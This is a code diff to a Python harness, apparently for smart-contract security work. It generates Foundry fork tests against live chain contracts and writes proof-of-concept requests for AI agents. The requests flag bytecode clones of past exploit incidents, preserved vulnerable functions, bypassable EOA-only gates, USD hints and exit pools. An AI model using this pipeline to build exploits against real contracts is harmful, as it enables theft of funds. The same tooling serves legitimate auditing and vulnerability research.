     target_addr: str,
     token_addrs: List[str],
     slices: List[CausalSlice],
-    timeout_sec: int = 75,
+    timeout_sec: int = 120,
     ckpt_path: Optional[Path] = None,
     ckpt_data: Optional[Dict[str, Any]] = None,
-    slice_chunk_size: int = 8,
+    slice_chunk_size: int = 12,
     vault_addresses: Optional[Sequence[str]] = None,
     gas_price_wei: int = 0,
     exit_routes: Optional[Dict[str, Dict[str, Any]]] = None,
-    max_tests_per_chunk: int = 12,
+    max_tests_per_chunk: int = 48,
     target_addrs: Optional[Sequence[str]] = None,
+    session_id: str = "",
 ) -> ForgeRunOutcome:
     """
     Foundry(tools/foundry/forge.exe) 직접 포크 하네스 생성, 치트코드 화이트리스트 검증 및 슬라이스 청크 단위 체크포인트 실행.
@@ -23938,6 +24811,8 @@ def generate_and_run_forge_suites(
 
     c = _norm_chain(chain)
     urls = router.candidate_urls(c, need_archive=True, for_forge=True) if block_pin > 0 else ["http://127.0.0.1:8545"]
+    if block_pin > 0 and urls:
+        urls = _filter_live_verified_rpc_urls(router, c, urls[:16], limit=5, block_pin=block_pin, need_archive=True) or urls
     if not urls:
         return ForgeRunOutcome(
             executed=False,
@@ -24044,8 +24919,8 @@ def generate_and_run_forge_suites(
         )
 
     safe_slug = _safe_solidity_ident(slug)
-    chunk_sz = max(1, min(16, int(slice_chunk_size or 8)))
-    max_tests = max(1, int(max_tests_per_chunk or 12))
+    chunk_sz = max(1, min(16, int(slice_chunk_size or 12)))
+    max_tests = max(1, int(max_tests_per_chunk or 48))
     chunks: List[List[CausalSlice]] = []
     cur_chunk: List[CausalSlice] = []
     cur_tests = 0
@@ -24062,56 +24937,165 @@ def generate_and_run_forge_suites(
 
     last_err = ""
     pin_gas_wei = int(gas_price_wei) if gas_price_wei > 0 else (fetch_gas_price_wei(router, c, block_pin) if block_pin > 0 else 0)
+    eff_live_sid = str(session_id or getattr(router, "session_id", "") or "").strip()
+    _top_rpc_host = urllib.parse.urlparse(urls[0]).netloc if urls else ""
+    _emit_progress(
+        "S4_FORGE_SUITE_START",
+        slug=slug,
+        chain=c,
+        block_pin=block_pin,
+        session_id=eff_live_sid,
+        detail=f"chunks={len(chunks)} slices={len(remaining)} rpc={_top_rpc_host}",
+        router=router,
+        extra={"forge_total_chunks": len(chunks), "forge_done_chunks": 0, "forge_slices": len(remaining), "forge_rpc": _top_rpc_host},
+    )
+    _done_chunks_ctr = 0
+    _done_chunks_lock = threading.Lock()
+    _suite_bad_rpcs: Set[str] = set()
+    _suite_rpc_lock = threading.Lock()
+    _is_live_suite = _is_live_real_router(router)
+    _rpc_busy: Dict[str, int] = {u: 0 for u in urls}
+    _rpc_est_dt: Dict[str, float] = {
+        u: (30.0 if _archive_rpc_tier(u) <= 1 else 75.0) * (1.0 + 0.12 * idx_u)
+        for idx_u, u in enumerate(urls)
+    }
 
-    for chunk_idx, chunk in enumerate(chunks):
-        abs_idx = base_chunk_idx + chunk_idx
-        chunk_slug = slug if abs_idx == 0 else f"{slug}_{abs_idx}"
-        rel_path = f"test/Verify_{safe_slug}.t.sol" if abs_idx == 0 else f"test/Verify_{safe_slug}_{abs_idx}.t.sol"
-        sol_code = _render_minimal_solidity_harness(
-            slug=chunk_slug,
+    def _run_one_chunk(_args):
+        nonlocal _done_chunks_ctr
+        _cidx, _chunk = _args
+        _t_ch0 = time.monotonic()
+        _abs = base_chunk_idx + _cidx
+        _cslug = slug if _abs == 0 else f"{slug}_{_abs}"
+        _rel = f"test/Verify_{safe_slug}.t.sol" if _abs == 0 else f"test/Verify_{safe_slug}_{_abs}.t.sol"
+        _sol = _render_minimal_solidity_harness(
+            slug=_cslug,
             chain=c,
             block_pin=block_pin,
             caller=caller,
             target_addr=target_addr,
             token_addrs=token_addrs,
-            slices=chunk,
+            slices=_chunk,
             vault_addresses=vault_addresses,
             exit_routes=exit_routes,
         )
-        chunk_outcome: Optional[ForgeRunOutcome] = None
-        last_ws: Optional[Path] = None
-        for rpc_url in urls[:3]:
-            ws = ensure_clean_forge_workspace({c: rpc_url}, slug=slug, offline=(block_pin <= 0))
-            last_ws = ws
-            test_file = ws / rel_path
-            test_file.write_text(sol_code, encoding="utf-8")
-            outcome = execute_forge_test_file(
-                ws,
-                rel_path,
-                sol_code,
-                timeout_sec=timeout_sec,
-                allowed_caller=caller,
-                fork_url=(rpc_url if block_pin > 0 else ""),
-                fork_block=block_pin,
-                forbid_inline_fork=(block_pin > 0),
-                target_addr=target_addr,
-                gas_price_wei=pin_gas_wei,
-                offline=(block_pin <= 0),
-                target_addrs=target_addrs,
-                chain=c,
-            )
-            chunk_outcome = outcome
+        _out: Optional[ForgeRunOutcome] = None
+        _ws: Optional[Path] = None
+        _tried_rpcs: Set[str] = set()
+        _used_rpc = urls[0] if urls else ""
+        _max_att = min(3, len(urls))
+        for _att_i in range(_max_att):
+            if _is_live_suite and len(urls) > 1:
+                with _suite_rpc_lock:
+                    _avail = [u for u in urls if u not in _tried_rpcs and u not in _suite_bad_rpcs]
+                    if not _avail and _att_i == 0:
+                        _avail = [u for u in urls if u not in _tried_rpcs]
+                    if not _avail:
+                        break
+                    _avail.sort(
+                        key=lambda u: ((_rpc_busy.get(u, 0) + 1) * _rpc_est_dt.get(u, 30.0), urls.index(u) if u in urls else 99)
+                    )
+                    _rpc = _avail[0]
+                    _rpc_busy[_rpc] = _rpc_busy.get(_rpc, 0) + 1
+            else:
+                with _suite_rpc_lock:
+                    _avail_s = [u for u in urls if u not in _tried_rpcs and u not in _suite_bad_rpcs]
+                    if not _avail_s and _att_i == 0:
+                        _avail_s = [u for u in urls if u not in _tried_rpcs]
+                if not _avail_s:
+                    break
+                _rpc = _avail_s[0]
+            _tried_rpcs.add(_rpc)
+            _used_rpc = _rpc
+            _t_attempt0 = time.monotonic()
+            outcome = None
+            try:
+                _ws = ensure_clean_forge_workspace({c: _rpc}, slug=_cslug, offline=(block_pin <= 0))
+                test_file = _ws / _rel
+                test_file.write_text(_sol, encoding="utf-8")
+                outcome = execute_forge_test_file(
+                    _ws,
+                    _rel,
+                    _sol,
+                    timeout_sec=timeout_sec,
+                    allowed_caller=caller,
+                    fork_url=(_rpc if block_pin > 0 else ""),
+                    fork_block=block_pin,
+                    forbid_inline_fork=(block_pin > 0),
+                    target_addr=target_addr,
+                    gas_price_wei=pin_gas_wei,
+                    offline=(block_pin <= 0),
+                    target_addrs=target_addrs,
+                    chain=c,
+                )
+            finally:
+                if _is_live_suite:
+                    _att_dt = max(1.0, time.monotonic() - _t_attempt0)
+                    with _suite_rpc_lock:
+                        _rpc_busy[_rpc] = max(0, _rpc_busy.get(_rpc, 1) - 1)
+                        if outcome is not None and outcome.executed:
+                            prev_est = _rpc_est_dt.get(_rpc, _att_dt)
+                            _rpc_est_dt[_rpc] = (0.4 * prev_est) + (0.6 * _att_dt)
+                        else:
+                            _rpc_est_dt[_rpc] = max(_rpc_est_dt.get(_rpc, 30.0), _att_dt) * 4.0
+            _out = outcome
             if outcome.executed or "CHEATCODE" in outcome.error_reason:
                 break
             if block_pin > 0:
-                fk_fg = _classify_rpc_error(outcome.error_reason)
-                if fk_fg in ("quota", "gap", "wrong_chain") and callable(getattr(router, "_record_failure", None)):
-                    router._record_failure(rpc_url, fk_fg, cid=CHAIN_IDS.get(c, 0))
+                fk_fg = (
+                    "auth_dead"
+                    if _is_auth_denied_rpc_error(outcome.error_reason)
+                    else (
+                        "timeout"
+                        if outcome.error_reason in ("FORGE_TIMEOUT", "TRACE_REPLAY_UNVERIFIED")
+                        else _classify_rpc_error(outcome.error_reason)
+                    )
+                )
+                if _is_live_suite and (not outcome.executed or fk_fg in ("auth_dead", "quota", "timeout", "wrong_chain")):
+                    with _suite_rpc_lock:
+                        _suite_bad_rpcs.add(_rpc)
+                if fk_fg in ("auth_dead", "quota", "timeout", "gap", "wrong_chain") and callable(getattr(router, "_record_failure", None)):
+                    router._record_failure(_rpc, fk_fg, cid=CHAIN_IDS.get(c, 0))
+        with _done_chunks_lock:
+            _done_chunks_ctr += 1
+            _cur_done = _done_chunks_ctr
+        _ch_dt = time.monotonic() - _t_ch0
+        _ch_host = urllib.parse.urlparse(_used_rpc).netloc if _used_rpc else ""
+        _ch_detail = (
+            f"chunk={_cur_done}/{len(chunks)} dt={_ch_dt:.1f}s exec={bool(_out and _out.executed)} "
+            f"pass={int(_out.passed_tests if _out else 0)} fail={int(_out.failed_tests if _out else 0)} "
+            f"gains={len(_out.conservation_gains) if _out else 0} rpc={_ch_host}"
+        )
+        if _out and _out.error_reason:
+            _ch_detail = f"{_ch_detail} err={_out.error_reason[:64]}"
+        _emit_progress(
+            "S4_FORGE_CHUNK_DONE",
+            slug=slug,
+            chain=c,
+            block_pin=block_pin,
+            session_id=eff_live_sid,
+            detail=_ch_detail,
+            router=router,
+            extra={"forge_done_chunks": _cur_done, "forge_total_chunks": len(chunks)},
+        )
+        return _out, _ws, _rel, _sol, _chunk
+
+    _chunk_jobs = list(enumerate(chunks))
+    if len(_chunk_jobs) >= 2 and _is_live_suite:
+        _max_ch_workers = min(4 if len(urls) <= 1 else min(8, max(4, len(urls))), len(_chunk_jobs))
+        with concurrent.futures.ThreadPoolExecutor(max_workers=_max_ch_workers) as ex_ch:
+            _chunk_results = list(ex_ch.map(_run_one_chunk, _chunk_jobs))
+    else:
+        _chunk_results = [_run_one_chunk(_j) for _j in _chunk_jobs]
+    for chunk_idx, chunk in enumerate(chunks):
+        chunk_outcome, last_ws, rel_path, sol_code, _chunk = _chunk_results[chunk_idx]
+        abs_idx = base_chunk_idx + chunk_idx
         if chunk_outcome is None or not chunk_outcome.executed:
-            last_err = chunk_outcome.error_reason if chunk_outcome else "FORGE_ALL_RPCS_FAILED"
-            if "CHEATCODE" in last_err:
+            cur_err = chunk_outcome.error_reason if chunk_outcome else "FORGE_ALL_RPCS_FAILED"
+            if not last_err:
+                last_err = cur_err
+            if "CHEATCODE" in cur_err:
                 return chunk_outcome  # type: ignore[return-value]
-            break
+            continue
 
         if abs_idx > 0 and last_ws is not None and not chunk_outcome.conservation_gains:
             try:
@@ -24723,7 +25707,7 @@ def _domain_deltas(
     w_dec_raw = int((decimals_map or {}).get(wnative, 18)) if wnative else 18
     w_dec = w_dec_raw if 0 <= w_dec_raw <= 77 else 18
 
-    _UINT256_MAX_SAT: int = (1 << 256) - 1
+    _UINT256_MAX_SAT: int = _UINT256_MAX
 
     def _sat_add_u256(a: int, b: int) -> int:
         # Solidity _satAdd cap (type(uint256).max) parity: Python int unbounded -> saturate to uint256 max
@@ -25446,32 +26430,147 @@ def _wrap_self_isolated_cmd(env_json_path: Path, args_tail: str) -> str:
     )
 
 
-def _resolve_request_rpc_and_cast_suffix(
-    router: Optional[RPCRouter],
-    chain: str,
-    block_pin: int,
-) -> Tuple[str, str, str]:
-    c = _norm_chain(chain)
-    rpc_u = ""
-    if router is not None and (int(block_pin) > 0 or _is_live_real_router(router)):
-        cands = router.candidate_urls(c, need_archive=True, for_forge=True)
-        rpc_u = cands[0] if cands else ""
-    eff_rpc_u = rpc_u or "http://127.0.0.1:8545"
-    cast_blk_suffix = f" --block {int(block_pin)}" if int(block_pin) > 0 else ""
-    return c, eff_rpc_u, cast_blk_suffix
+def _archive_rpc_tier(url: str) -> int:
+    """Rank commercial keyed archive RPCs ahead of throttled free public gateways."""
+    low = str(url or "").strip().lower()
+    if low.startswith(("http://127.0.0.1", "http://localhost")):
+        return 0
+    try:
+        parsed = urllib.parse.urlparse(low)
+        host = parsed.netloc
+        path = parsed.path or ""
+    except Exception:
+        host, path = "", low
+    segs = [s for s in path.strip("/").split("/") if s]
+    is_keyed_path = bool(segs) and (len(segs) >= 2 or ("quiknode.pro" in host)) and not path.rstrip("/").endswith(("/public", "/rpc"))
+    if any(h in host for h in ("ankr.com", "nodereal.io", "alchemy.com", "infura.io", "quiknode.pro", "quicknode.com")) and is_keyed_path:
+        return 1
+    if "blockreq.com" in host and "/v1/rpc/public" not in path:
+        return 2
+    if any(h in host for h in ("mainnet.base.org", "gateway.tenderly.co", "drpc.org", "daybreak-rpc.network")) or "/v1/rpc/public" in path:
+        return 4
+    return 3
 
 
-def _resolve_request_failover_rpcs(
+def _filter_live_verified_rpc_urls(
     router: Optional[RPCRouter],
     chain: str,
-    block_pin: int,
-    fallback_url: str,
+    urls: Sequence[str],
+    *,
+    limit: int = 4,
+    block_pin: int = 0,
+    need_archive: bool = False,
 ) -> List[str]:
+    clean = [str(u) for u in urls if u]
+    if not clean:
+        return []
+    cid_r = CHAIN_IDS.get(chain, 0)
+    if router is None or not _is_live_real_router(router) or cid_r <= 0 or not callable(getattr(router, "_verify_endpoint_chain_id", None)):
+        return clean[:limit]
+
+    check_archive_blk = bool(need_archive and int(block_pin or 0) > 0 and callable(getattr(router, "_pooled_post", None)))
+    btag_r = hex(int(block_pin)) if check_archive_blk else ""
+    arch_probe_contract = (
+        _norm_addr(WRAPPED_NATIVE_BY_CHAIN.get(chain, "")) or "0xcA11bde05977b3631167028862bE2a173976CA11"
+    )
+    arch_probe_data = "0x18160ddd" if arch_probe_contract != "0xcA11bde05977b3631167028862bE2a173976CA11" else "0x42cbb15c"
+
+    def _probe_one(item: Tuple[int, str]) -> Optional[Tuple[int, int, float, int, str]]:
+        idx_u, cand_u = item
+        penalty = 0
+        try:
+            now_u = time.time()
+            lock_u = getattr(router, "_lock", None)
+            if lock_u is not None:
+                with lock_u:
+                    if float(getattr(router, "_cool_until", {}).get(cand_u, 0.0) or 0.0) > now_u:
+                        penalty = 2
+                    elif float(getattr(router, "_demote_until", {}).get(cand_u, 0.0) or 0.0) > now_u:
+                        penalty = 1
+        except Exception:
+            pass
+        if cand_u.startswith(("http://127.0.0.1", "http://localhost")):
+            return (0, penalty, 0.0, idx_u, cand_u)
+        t0_p = time.perf_counter()
+        if check_archive_blk:
+            try:
+                batch_body = json.dumps(
+                    [
+                        {"jsonrpc": "2.0", "id": 1, "method": "eth_chainId", "params": []},
+                        {"jsonrpc": "2.0", "id": 2, "method": "eth_call", "params": [{"to": arch_probe_contract, "data": arch_probe_data}, btag_r]},
+                    ]
+                ).encode("utf-8")
+                raw_b = router._pooled_post(cand_u, batch_body, timeout=3.0)
+                dt_p = time.perf_counter() - t0_p
+                dec_b = json.loads(raw_b.decode("utf-8", errors="replace"))
+                if isinstance(dec_b, list):
+                    by_id = {it.get("id"): it for it in dec_b if isinstance(it, dict)}
+                    cid_res = (by_id.get(1) or {}).get("result")
+                    if not (isinstance(cid_res, str) and cid_res.startswith("0x") and int(cid_res, 16) == cid_r):
+                        if isinstance(cid_res, str) and cid_res.startswith("0x"):
+                            router._record_failure(cand_u, "wrong_chain", cid=cid_r)
+                        return None
+                    with router._lock:
+                        router._verified_chain_urls.add((cid_r, cand_u))
+                    arch_ok = _eval_archive_probe_resp(by_id.get(2))
+                    if arch_ok:
+                        router._record_success(cand_u, dt_p * 1000.0, cid=cid_r)
+                    return (0 if arch_ok else 1, penalty, dt_p, idx_u, cand_u)
+            except Exception as exc_p:
+                if _is_auth_denied_rpc_error(exc_p) or _classify_rpc_error(exc_p) == "auth_dead":
+                    router._record_failure(cand_u, "auth_dead", cid=cid_r)
+                    return None
+        if router._verify_endpoint_chain_id(cand_u, cid_r, timeout=3.0):
+            dt_p = time.perf_counter() - t0_p
+            arch_miss = 0
+            if check_archive_blk:
+                arch_miss = 1
+                try:
+                    single_b = json.dumps({"jsonrpc": "2.0", "id": 2, "method": "eth_call", "params": [{"to": arch_probe_contract, "data": arch_probe_data}, btag_r]}).encode("utf-8")
+                    dec_s = json.loads(router._pooled_post(cand_u, single_b, timeout=2.5).decode("utf-8", errors="replace"))
+                    if _eval_archive_probe_resp(dec_s):
+                        arch_miss = 0
+                except Exception:
+                    arch_miss = 1
+            return (arch_miss, penalty, dt_p, idx_u, cand_u)
+        return None
+
+    indexed = list(enumerate(clean[:18]))
+    hits: List[Tuple[int, int, float, int, str]] = []
+    if len(indexed) >= 2:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=min(10, len(indexed))) as ex_u:
+            for res_u in ex_u.map(_probe_one, indexed):
+                if res_u is not None:
+                    hits.append(res_u)
+    else:
+        res_u = _probe_one(indexed[0])
+        if res_u is not None:
+            hits.append(res_u)
+    if not hits:
+        return clean[:limit]
+    hits.sort(key=lambda x: (x[0], x[1], _archive_rpc_tier(x[4]) if check_archive_blk else 0, x[2], x[3]))
+    return [x[4] for x in hits[:limit]]
+
+
+def _resolve_request_rpc_bundle(
+    router: Optional[RPCRouter],
+    chain: str,
+    block_pin: int,
+) -> Tuple[str, str, str, List[str]]:
+    """단일 병렬 프로브(limit=4)로 주 RPC 엔드포인트와 failover 목록을 동시 결정한다."""
+    c = _norm_chain(chain)
+    failover_urls: List[str] = []
     if router is not None and (int(block_pin) > 0 or _is_live_real_router(router)):
-        cands = list(router.candidate_urls(chain, need_archive=True, for_forge=True)[:4])
-        if cands:
-            return cands
-    return [fallback_url]
+        cands = list(router.candidate_urls(c, need_archive=True, for_forge=True)[:16])
+        verified = _filter_live_verified_rpc_urls(
+            router, c, cands, limit=4, block_pin=int(block_pin), need_archive=(int(block_pin) > 0)
+        )
+        failover_urls = verified if verified else cands[:4]
+    eff_rpc_u = failover_urls[0] if failover_urls else "http://127.0.0.1:8545"
+    if not failover_urls:
+        failover_urls = [eff_rpc_u]
+    cast_blk_suffix = f" --block {int(block_pin)}" if int(block_pin) > 0 else ""
+    return c, eff_rpc_u, cast_blk_suffix, failover_urls
 
 
 def _resolve_slug_artifact_dir(slug: str, root_dir: Optional[Path] = None) -> Tuple[str, Path]:
@@ -25606,9 +26705,10 @@ def emit_poc_requests_for_slug(
     req_dir = pdir / "poc_requests"
     req_dir.mkdir(parents=True, exist_ok=True)
     (pdir / "verdicts").mkdir(parents=True, exist_ok=True)
-    c, eff_rpc_u, cast_blk_suffix = _resolve_request_rpc_and_cast_suffix(router, chain, block_pin)
+    c, eff_rpc_u, cast_blk_suffix, failover_rpcs_poc = _resolve_request_rpc_bundle(router, chain, block_pin)
     ws = ensure_clean_forge_workspace({c: eff_rpc_u}, slug=slug, offline=(block_pin <= 0))
-    fork_cli_suffix = f' --fork-url "{eff_rpc_u}" --fork-block-number {int(block_pin)}' if block_pin > 0 else ""
+    sbn_flag_poc = " --fork-state-by-number" if _requires_fork_state_by_number(c, eff_rpc_u) else ""
+    fork_cli_suffix = f' --fork-url "{eff_rpc_u}" --fork-block-number {int(block_pin)}{sbn_flag_poc}' if block_pin > 0 else ""
     ws_env_hint = _sync_forge_dir_config_and_env(ws)
     ws_env_json = ws / "_isolated_env.json"
     sid_clean = str(session_id or "").strip().lower()
@@ -25805,9 +26905,27 @@ def emit_poc_requests_for_slug(
                 "chain_block": f"{c}@{block_pin}",
                 "legs": legs_val,
                 "channels": channels_val,
-                "exit_pools": len(exit_pool_summary or []),
+                "exit_pools": len((exit_pool_summary or {}).get("pools") or {}),
                 "flash_needed": bool(eff_flash_plan.get("flash_search_needed")),
-                "next": "EDIT editable_files[0] -> RUN isolated_commands.preverify_forge_test -> WRITE editable_files[1]",
+                **(
+                    {"eoa_only_gate_eip7702_bypassable": True}
+                    if any((s_obj.prescreen_diagnostics or {}).get("eoa_only_gate_eip7702_bypassable") for s_obj in (slice_objs or ()))
+                    else {}
+                ),
+                "next": "READ similarity_analysis WHY-CAPTURED FIRST -> EDIT editable_files[0] -> RUN isolated_commands.preverify_forge_test -> WRITE editable_files[1]",
+            },
+            "similarity_analysis": {
+                "why_captured": "Matched incident seed by bytecode similarity / skeleton hash / proxy impl pointer; see match_type/similarity/patch_rank_delta/vuln_preserved below to decide whether the vulnerable function is preserved.",
+                "match_type": str((poc_meta_hint if isinstance(poc_meta_hint, dict) else {}).get("mode_b_match_type") or ""),
+                "similarity": float((poc_meta_hint if isinstance(poc_meta_hint, dict) else {}).get("mode_b_similarity") or 0.0),
+                "patch_rank_delta": str((poc_meta_hint if isinstance(poc_meta_hint, dict) else {}).get("mode_b_patch_kind") or ""),
+                "vuln_preserved": (poc_meta_hint if isinstance(poc_meta_hint, dict) else {}).get("mode_b_vuln_preserved"),
+                "source_slug": str((poc_meta_hint if isinstance(poc_meta_hint, dict) else {}).get("mode_b_source_slug") or ""),
+                "source_chain": str((poc_meta_hint if isinstance(poc_meta_hint, dict) else {}).get("mode_b_source_chain") or ""),
+                "source_addrs": list((poc_meta_hint if isinstance(poc_meta_hint, dict) else {}).get("mode_b_source_addrs") or []),
+                "proxy_addrs": list((poc_meta_hint if isinstance(poc_meta_hint, dict) else {}).get("mode_b_proxy_addrs") or []),
+                "hint_usd": (poc_meta_hint if isinstance(poc_meta_hint, dict) else {}).get("mode_b_hint_usd"),
+                "agent_guidance": "Prioritize legs on selectors that touch the preserved vulnerable function; if similarity is low (<0.8) or vuln_preserved is False, treat PoC as patched-fork check with $0-balance exit gating before claiming safe.",
             },
             "known_metadata": poc_meta_hint if isinstance(poc_meta_hint, dict) else {},
             "recommended_web_queries": list(
@@ -25825,7 +26943,7 @@ def emit_poc_requests_for_slug(
                     ]
                 )
             ),
-            "bundled_failover_rpc_urls": _resolve_request_failover_rpcs(router, c, block_pin, eff_rpc_u),
+            "bundled_failover_rpc_urls": list(failover_rpcs_poc),
             "isolated_commands": {
                 "preverify_forge_test": _wrap_self_isolated_cmd(
                     ws_env_json,
@@ -26249,7 +27367,7 @@ def emit_address_discovery_request(
     """
     slug, pdir = _resolve_slug_artifact_dir(slug)
     pdir.mkdir(parents=True, exist_ok=True)
-    c, eff_rpc_u, cast_blk_suffix = _resolve_request_rpc_and_cast_suffix(router, chain, block_pin)
+    c, eff_rpc_u, cast_blk_suffix, failover_rpcs_poc = _resolve_request_rpc_bundle(router, chain, block_pin)
     cand_probe_addr = _checksum(WRAPPED_NATIVE_BY_CHAIN.get(c) or "0x0000000000000000000000000000000000000001")
     sample_stable = _checksum((CHAIN_STABLES.get(c) or [cand_probe_addr])[0])
     base_slug = _strip_chain_suffix_slug(slug)
@@ -26290,7 +27408,7 @@ def emit_address_discovery_request(
         "known_metadata": meta_clean,
         "editable_files": [rel_out],
         "readable_files": [rel_req],
-        "bundled_failover_rpc_urls": _resolve_request_failover_rpcs(router, c, block_pin, eff_rpc_u),
+        "bundled_failover_rpc_urls": list(failover_rpcs_poc),
         "bundled_chain_rpc_urls": (
             {
                 ch_k: ch_urls[0]
@@ -27495,7 +28613,7 @@ def _probe_clone_liquid_balance_hints(
     out_dec: Dict[Tuple[str, str], Decimal] = {}
     chain_items = list(by_chain.items())
     if len(chain_items) >= 2 and not is_mock:
-        with concurrent.futures.ThreadPoolExecutor(max_workers=min(6, len(chain_items))) as ex_cb:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=min(12, len(chain_items))) as ex_cb:
             for ch_part in ex_cb.map(_probe_chain_entry, chain_items):
                 out_dec.update(ch_part)
     else:
@@ -31879,32 +32997,64 @@ def process_agent_submissions(
                                         _append_unique(cid_targets_set, seen_cid_targets, na_ct)
                     cid_gas_w = fetch_gas_price_wei(router, chain, block_pin) if block_pin > 0 else 1_000_000_000
                     urls = router.candidate_urls(chain, need_archive=True, for_forge=True) if block_pin > 0 else ["http://127.0.0.1:8545"]
+                    if block_pin > 0:
+                        urls = _filter_live_verified_rpc_urls(router, chain, urls[:16], limit=6, block_pin=block_pin, need_archive=True) or urls[:6]
                     rel_t = f"test/{tf.name}"
                     outcome: Optional[ForgeRunOutcome] = None
-                    for rpc_u in (urls[:4] or ["http://127.0.0.1:8545"]):
-                        ensure_clean_forge_workspace({chain: rpc_u}, slug=slug, offline=(block_pin <= 0))
-                        outcome = execute_forge_test_file(
-                            ws,
-                            rel_t,
-                            sol_src,
-                            timeout_sec=180,
-                            allowed_caller=cid_caller,
-                            fork_url=(rpc_u if block_pin > 0 else ""),
-                            fork_block=block_pin,
-                            forbid_inline_fork=(block_pin > 0),
-                            verify_trace_always=True,
-                            target_addr=cid_target,
-                            gas_price_wei=cid_gas_w,
-                            offline=(block_pin <= 0),
-                            strict_agent_accounting=True,
-                            target_addrs=cid_targets_set or None,
-                            chain=chain,
-                        )
-                        if outcome.executed or "CHEATCODE" in outcome.error_reason:
+                    for rpc_u in (urls[:6] or ["http://127.0.0.1:8545"]):
+                        outcome = None
+                        _rpc_h = urllib.parse.urlparse(rpc_u).netloc if rpc_u else ""
+                        for _attempt in range(2):
+                            _emit_progress(
+                                "AGENT_VERIFY_FORGE",
+                                slug=slug,
+                                chain=chain,
+                                block_pin=block_pin,
+                                session_id=ckpt_sid,
+                                detail=f"cid={cid} rpc={_rpc_h} attempt={_attempt + 1}",
+                                router=router,
+                            )
+                            ensure_clean_forge_workspace({chain: rpc_u}, slug=slug, offline=(block_pin <= 0))
+                            outcome = execute_forge_test_file(
+                                ws,
+                                rel_t,
+                                sol_src,
+                                timeout_sec=360,
+                                allowed_caller=cid_caller,
+                                fork_url=(rpc_u if block_pin > 0 else ""),
+                                fork_block=block_pin,
+                                forbid_inline_fork=(block_pin > 0),
+                                verify_trace_always=True,
+                                target_addr=cid_target,
+                                gas_price_wei=cid_gas_w,
+                                offline=(block_pin <= 0),
+                                strict_agent_accounting=True,
+                                target_addrs=cid_targets_set or None,
+                                chain=chain,
+                            )
+                            if outcome.executed and (outcome.passed_tests > 0 or "CHEATCODE" in outcome.error_reason):
+                                break
+                            err_sub_l = str(outcome.error_reason or "").lower()
+                            if (
+                                _is_auth_denied_rpc_error(outcome.error_reason)
+                                or outcome.error_reason in ("FORGE_TIMEOUT", "TRACE_REPLAY_UNVERIFIED")
+                                or "CHEATCODE" in outcome.error_reason
+                                or _text_has_any_marker(outcome.error_reason, _FORGE_RPC_FAIL_MARKERS)
+                            ):
+                                break
+                        if outcome.executed and (outcome.passed_tests > 0 or "CHEATCODE" in outcome.error_reason):
                             break
                         if block_pin > 0:
-                            fk_sub = _classify_rpc_error(outcome.error_reason)
-                            if fk_sub in ("quota", "gap", "wrong_chain") and callable(getattr(router, "_record_failure", None)):
+                            fk_sub = (
+                                "auth_dead"
+                                if _is_auth_denied_rpc_error(outcome.error_reason)
+                                else (
+                                    "timeout"
+                                    if outcome.error_reason in ("FORGE_TIMEOUT", "TRACE_REPLAY_UNVERIFIED")
+                                    else _classify_rpc_error(outcome.error_reason)
+                                )
+                            )
+                            if fk_sub in ("auth_dead", "quota", "timeout", "gap", "wrong_chain") and callable(getattr(router, "_record_failure", None)):
                                 router._record_failure(rpc_u, fk_sub, cid=CHAIN_IDS.get(chain, 0))
                     if outcome is None:
                         continue
@@ -33439,12 +34589,14 @@ def _search_blockscout_similar_contracts(
     cand_addrs: List[str] = []
     seen_c: Set[str] = set()
     base_url = bs_host.rstrip("/")
-    for term in search_terms:
+
+    def _query_bs_term(term: str) -> List[str]:
+        found_t: List[str] = []
         try:
             q_url = f"{base_url}/api/v2/search?q={urllib.parse.quote(term)}"
             doc = router.http_get_json(q_url, timeout=5.0)
         except Exception:
-            continue
+            return found_t
         for item in ((doc or {}).get("items") or []) if isinstance(doc, dict) else ():
             if not isinstance(item, dict):
                 continue
@@ -33452,7 +34604,23 @@ def _search_blockscout_similar_contracts(
             if item_t and "contract" not in item_t and "address" not in item_t:
                 continue
             na = _norm_addr(str(item.get("address") or item.get("address_hash") or ""))
-            if na and na not in excl_set and na not in seen_c and _is_non_precompile_addr(na):
+            if na and na not in excl_set and _is_non_precompile_addr(na):
+                found_t.append(na)
+        return found_t
+
+    if _is_live_real_router(router) and len(search_terms) > 1:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=min(3, len(search_terms))) as ex_bst:
+            term_lists = list(ex_bst.map(_query_bs_term, search_terms))
+    else:
+        term_lists = []
+        for t_bs in search_terms:
+            res_t = _query_bs_term(t_bs)
+            term_lists.append(res_t)
+            if sum(len(x) for x in term_lists) >= 16:
+                break
+    for lst_t in term_lists:
+        for na in lst_t:
+            if na not in seen_c:
                 seen_c.add(na)
                 cand_addrs.append(na)
                 if len(cand_addrs) >= 16:
@@ -33463,7 +34631,7 @@ def _search_blockscout_similar_contracts(
         return []
     cand_sources_by_addr: Dict[str, Dict[str, str]] = {}
     if seed_sources:
-        for ca in cand_addrs[:8]:
+        def _fetch_bs_src(ca: str) -> Tuple[str, Optional[Dict[str, str]]]:
             try:
                 sc_doc = router.http_get_json(f"{base_url}/api/v2/smart-contracts/{_checksum(ca)}", timeout=4.0)
                 if isinstance(sc_doc, dict) and sc_doc.get("source_code"):
@@ -33472,13 +34640,21 @@ def _search_blockscout_similar_contracts(
                     for ex_s in sc_doc.get("additional_sources") or ():
                         if isinstance(ex_s, dict) and ex_s.get("file_path") and ex_s.get("source_code"):
                             smap[str(ex_s["file_path"])] = str(ex_s["source_code"])
-                    cand_sources_by_addr[ca] = smap
-                    continue
+                    return ca, smap
             except Exception:
                 pass
-            es_fb = _fetch_etherscan_v2_source_for_addr(router, cid, ca)
-            if es_fb:
-                cand_sources_by_addr[ca] = es_fb
+            return ca, _fetch_etherscan_v2_source_for_addr(router, cid, ca)
+
+        if _is_live_real_router(router) and len(cand_addrs[:8]) > 1:
+            with concurrent.futures.ThreadPoolExecutor(max_workers=min(4, len(cand_addrs[:8]))) as ex_bss:
+                for ca_s, smap_s in ex_bss.map(_fetch_bs_src, cand_addrs[:8]):
+                    if smap_s:
+                        cand_sources_by_addr[ca_s] = smap_s
+        else:
+            for ca_s in cand_addrs[:8]:
+                _, smap_s = _fetch_bs_src(ca_s)
+                if smap_s:
+                    cand_sources_by_addr[ca_s] = smap_s
     return _score_live_addrs_against_seeds(
         router,
         c,
@@ -33726,8 +34902,8 @@ def _prioritize_closure_monitored_tokens(
             -(1 if raw_by_tok.get(nt, 0) > 0 else 0),
             -raw_by_tok.get(nt, 0),
             -(1 if nt in direct_seed_erc20_set else 0),
